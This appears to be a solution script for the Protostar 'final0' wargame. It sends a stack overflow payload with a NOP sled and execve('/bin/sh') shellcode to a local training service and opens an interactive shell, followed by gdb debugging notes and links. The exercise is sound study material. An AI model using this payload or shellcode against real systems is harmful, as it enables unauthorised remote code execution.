import socket
import struct
import time
import telnetlib

HOST="127.0.0.1"
PORT=2995

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

eip = struct.pack("I", 0xbffffc60+10)
nopsled = "\x90" * 100
exploit     = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = "A" * 512 + "\x00"  + "bbbccccddddeeeeffff" + eip + nopsled + "gggghhhhh" + exploit
s.send(payload + "\n") # "\n" indicates that transmission is over if not server is still waiting for more stuff, because you are using gets() to read input
#s.send("id")
#data = s.recv(2048) # end every payload you send with "\n" if not you will not receive anything and the function will be stuck here as it is waiting for the server to respond while the server is waiting for the end of the transmission most likely indicated by "\n"
#print "Received: ", data

t = telnetlib.Telnet()
t.sock = s
t.interact()

debug using `gdb /opt/protostar/bin/final0 /tmp/CORE_DUMP_FILE`

https://wiki.archlinux.org/title/Core_dump

https://exploit.education/protostar/

https://www.ibm.com/docs/en/zos/2.2.0?topic=functions-gets-read-string 

